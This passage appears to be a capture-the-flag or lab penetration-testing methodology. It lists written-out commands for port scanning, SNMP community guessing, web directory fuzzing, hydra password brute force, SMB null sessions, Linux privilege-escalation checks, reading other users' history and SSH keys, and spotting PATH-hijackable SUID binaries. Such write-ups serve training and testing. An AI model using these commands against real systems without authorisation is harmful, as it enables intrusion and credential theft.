Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.
